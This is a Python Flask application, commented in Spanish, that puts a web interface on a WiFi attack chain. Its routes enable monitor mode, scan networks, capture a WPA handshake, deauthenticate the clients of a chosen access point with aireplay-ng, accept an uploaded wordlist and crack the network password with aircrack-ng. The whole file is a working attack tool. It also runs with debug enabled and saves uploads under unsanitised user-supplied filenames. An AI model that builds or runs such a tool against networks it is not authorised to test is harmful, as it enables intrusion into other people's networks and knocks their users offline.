from flask import Flask, render_template, request, jsonify
import subprocess
import os

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads/'

# Asegúrate de que la carpeta de subida existe
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Variables globales para almacenar la interfaz y datos de la red
interface = ""
monitor_interface = None
handshake_file = "captura-01.cap"
bssid = ""
channel = ""
dictionary_path = ""

@app.route('/')
def index():
    return render_template('index01.html')

# Ruta para configurar la interfaz de red
@app.route('/set_interface', methods=['POST'])
def set_interface():
    global interface
    interface = request.form.get("interface")
    return jsonify({"status": f"Interfaz configurada a {interface}"})

# Ruta para iniciar el modo monitor
@app.route('/start_monitor', methods=['POST'])
def start_monitor():
    global monitor_interface
    if not interface:
        return jsonify({"status": "Error: No se ha configurado la interfaz de red"}), 400
    monitor_interface = f"{interface}"
    subprocess.run(["airmon-ng", "start", interface])
    return jsonify({"status": "Modo monitor iniciado", "interface": monitor_interface})

# Ruta para escanear redes WiFi
@app.route('/scan_networks', methods=['POST'])
def scan_networks():
    if not monitor_interface:
        return jsonify({"status": "Error: El modo monitor no está activo"}), 400
    result = subprocess.run(["airodump-ng", monitor_interface], capture_output=True, text=True)
    return jsonify({"status": "Escaneando redes", "output": result.stdout})

# Ruta para capturar handshake
@app.route('/capture_handshake', methods=['POST'])
def capture_handshake():
    global bssid, channel, monitor_interface, handshake_file
    bssid = request.json.get("bssid")
    channel = request.json.get("channel")
    capture_command = ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "captura", monitor_interface]
    subprocess.Popen(capture_command)
    return jsonify({"status": f"Capturando handshake para BSSID {bssid} en canal {channel}"})

# Ruta para desautenticar clientes
@app.route('/deauth', methods=['POST'])
def deauth():
    global monitor_interface, bssid
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, monitor_interface])
    return jsonify({"status": f"Desautenticando clientes en BSSID {bssid}"})

# Ruta para cargar el diccionario
@app.route('/upload_dictionary', methods=['POST'])
def upload_dictionary():
    global dictionary_path
    if 'dictionary' not in request.files:
        return jsonify({"status": "Error: No se seleccionó ningún archivo"}), 400
    file = request.files['dictionary']
    dictionary_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
    file.save(dictionary_path)
    return jsonify({"status": f"Diccionario cargado exitosamente en {dictionary_path}"})

# Ruta para descifrar el handshake
@app.route('/crack_password', methods=['POST'])
def crack_password():
    global dictionary_path, bssid, handshake_file
    if not dictionary_path:
        return jsonify({"status": "Error: No se ha cargado un diccionario"}), 400
    crack_command = ["aircrack-ng", "-w", dictionary_path, "-b", bssid, handshake_file]
    result = subprocess.run(crack_command, capture_output=True, text=True)
    return jsonify({"status": "Descifrando contraseña", "output": result.stdout})

# Ruta para detener el modo monitor
@app.route('/stop_monitor', methods=['POST'])
def stop_monitor():
    global interface
    subprocess.run(["airmon-ng", "stop", f"{interface}mon"])
    subprocess.run(["service", "NetworkManager", "restart"])
    return jsonify({"status": "Modo monitor detenido y red reiniciada"})

if __name__ == '__main__':
    app.run(debug=True)
